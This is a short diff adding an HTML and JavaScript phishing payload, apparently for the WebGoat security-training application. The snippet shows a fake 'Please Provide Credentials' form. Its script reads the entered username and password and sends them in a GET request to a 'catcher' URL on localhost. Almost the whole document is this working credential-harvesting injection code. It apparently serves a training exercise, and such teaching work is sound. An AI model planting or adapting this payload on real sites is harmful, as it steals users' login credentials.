@@ -1,1 +1,25 @@
-This attachment was removed because it contains data that could pose a security risk.
+// Simple script to capture credentials and put in GET request to URL.
+
+<h2> Please Provide Credentials </h2>
+
+<script type="text/javascript">
+	function phishForPassword() {
+		var userName = document.getElementById("user").value;
+		var passWord = document.getElementById("password").value;
+		alert('Username is: ' + userName);
+		alert('Password is: ' + passWord);
+		var redirectURI = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&";
+		window.location.href = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user='+ userName + '&password=' + passWord;
+	}
+</script>
+
+<form>
+		<br>
+		Username:
+	 <input type="text" name="user" id="user">
+	 <br>
+	 	Password:
+	 <input type="text" name="password" id="password">
+	 <br>
+	 <button onclick="phishForPassword()">Sign In</button>
+</form>
